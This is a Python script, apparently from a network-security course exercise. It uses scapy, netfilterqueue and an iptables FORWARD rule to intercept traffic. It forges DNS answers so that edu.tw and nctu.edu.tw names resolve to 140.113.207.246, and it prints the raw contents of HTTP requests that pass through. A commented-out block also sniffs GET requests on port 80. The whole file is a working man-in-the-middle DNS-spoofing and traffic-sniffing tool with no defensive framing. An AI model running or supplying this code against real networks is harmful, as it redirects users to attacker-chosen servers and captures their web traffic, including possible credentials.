from scapy.all import *
from scapy.layers import http
from scapy.layers.http import HTTPRequest
from netfilterqueue import NetfilterQueue
import os

dns_hosts = {
    b"edu.tw.": "140.113.207.246",
    b"nctu.edu.tw.": "140.113.207.246",
    b"www.nctu.edu.tw.": "140.113.207.246"
}

def modify_packet(packet):
    qname = packet[DNSQR].qname
    if qname not in dns_hosts:
        return packet
    packet[DNS].an = DNSRR(rrname=qname, rdata=dns_hosts[qname])
    packet[DNS].ancount = 1
    del packet[IP].len
    del packet[IP].chksum
    del packet[UDP].len
    del packet[UDP].chksum
#    print('DNS modified to',dns_hosts[qname])
    return packet

def process_packet(packet):
    scapy_packet = IP(packet.get_payload())
    if scapy_packet.haslayer(DNSRR):
        try:
            scapy_packet = modify_packet(scapy_packet)
        except IndexError:
            pass
        packet.set_payload(bytes(scapy_packet))
    if scapy_packet.haslayer(HTTPRequest):
        #print (scapy_packet[HTTPRequest].summary())
        print( scapy_packet[Raw])
    packet.accept()

QUEUE_NUM = 1
os.system("iptables -I FORWARD -j NFQUEUE --queue-num {}".format(QUEUE_NUM))
queue = NetfilterQueue()
try:
    queue.bind(QUEUE_NUM, process_packet)
    queue.run()
except KeyboardInterrupt:
    os.system("iptables --flush")
    print('tables flushed')


"""
def http_header(packet):
        http_packet=str(packet)
        if http_packet.find('GET'):
                return GET_print(packet)

def GET_print(packet1):
    ret = "***************************************GET PACKET****************************************************\n"
    ret += "\n".join(packet1.sprintf("{Raw:%Raw.load%}\n").split(r"\r\n"))
    ret += "*****************************************************************************************************\n"
    return ret
sniff(prn=http_header, filter="tcp port 80")

"""